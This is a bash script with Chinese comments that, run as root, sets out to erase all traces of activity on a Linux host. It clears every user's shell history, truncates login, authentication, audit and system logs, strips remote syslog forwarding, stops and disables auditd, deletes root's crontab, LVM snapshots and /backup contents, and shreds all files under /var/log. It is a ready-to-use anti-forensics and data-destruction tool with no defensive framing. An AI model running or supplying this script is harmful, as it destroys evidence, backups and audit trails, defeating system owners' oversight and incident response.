#!/bin/bash

# 确保使用root权限执行该脚本
if [ "$EUID" -ne 0 ]; then
    echo "请使用root权限执行该脚本"
    exit
fi

echo "开始彻底清除操作痕迹..."

# 1. 清除当前用户的bash历史
history -c   # 清空当前会话中的命令历史
shopt -s histoff  # 关闭命令历史记录功能
rm -f ~/.bash_history  # 删除当前用户的bash历史文件

# 删除所有用户的bash历史记录
for home_dir in /home/*; do
    if [ -f "$home_dir/.bash_history" ]; then
        echo "删除用户 ${home_dir##*/} 的bash历史记录"
        rm -f "$home_dir/.bash_history"
    fi
done
rm -f /root/.bash_history  # 删除root用户的bash历史文件

# 2. 清除系统日志
log_files=(
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
    "/var/log/auth.log"    # Debian/Ubuntu
    "/var/log/secure"      # CentOS/RHEL
    "/var/log/messages"
    "/var/log/syslog"
    "/var/log/audit/audit.log"
    "/var/log/cron"
    "/var/log/kern.log"
    "/var/log/maillog"
    "/var/log/dmesg"
    "/var/log/faillog"
)

for log_file in "${log_files[@]}"; do
    if [ -f "$log_file" ]; then
        echo "清除日志文件: $log_file"
        cat /dev/null > "$log_file"
    fi
done

# 3. 清除登录和失败的登录记录
echo "清除登录记录..."
cat /dev/null > /var/log/wtmp  # 清除成功的登录记录
cat /dev/null > /var/log/btmp  # 清除失败的登录记录
cat /dev/null > /var/log/lastlog  # 清除最后的登录记录

# 4. 禁止历史记录写入
export HISTSIZE=0  # 禁止保存历史命令
export HISTFILESIZE=0  # 禁止将历史命令保存到文件
unset HISTFILE  # 删除当前会话的历史文件路径

# 5. 清除临时文件和缓存
echo "清除临时文件和缓存..."
rm -rf /tmp/*
rm -rf /var/tmp/*

# 6. 清除进程、任务及计划任务日志
echo "清除计划任务日志..."
cat /dev/null > /var/log/cron  # 清除cron计划任务的记录
rm -f /var/spool/cron/crontabs/root  # 删除root的cron任务

# 7. 清除内核消息和内核缓冲区
echo "清除内核消息和缓冲区..."
dmesg --clear  # 清除内核缓冲区中的信息

# 8. 删除远程日志传输设置（如果存在）
if [ -f /etc/rsyslog.conf ]; then
    echo "删除远程日志传输设置..."
    sed -i '/^\*\.\*/d' /etc/rsyslog.conf  # 删除与远程日志传输相关的条目
    systemctl restart rsyslog  # 重新启动rsyslog服务
fi

# 9. 删除或禁用审计系统日志（auditd）
if systemctl is-active --quiet auditd; then
    echo "禁用auditd服务并清除日志..."
    systemctl stop auditd
    systemctl disable auditd
    cat /dev/null > /var/log/audit/audit.log  # 清空审计日志
fi

# 10. 检查并删除系统快照和备份（如果存在）
echo "删除可能存在的系统快照和备份..."
lvremove -f /dev/mapper/your-snapshot 2>/dev/null  # 删除LVM快照，具体快照名称需替换
rm -rf /backup/*  # 删除常见的本地备份目录

# 11. 防止恢复日志文件
echo "覆盖删除的日志文件以防恢复..."
shred -u /var/log/*  # 覆盖并删除日志文件
shred -u /var/log/*/*  # 覆盖并删除子目录中的日志文件

# 12. 强制同步磁盘，确保删除的文件不可恢复
sync

echo "操作完成，所有操作痕迹已尽可能清除。"
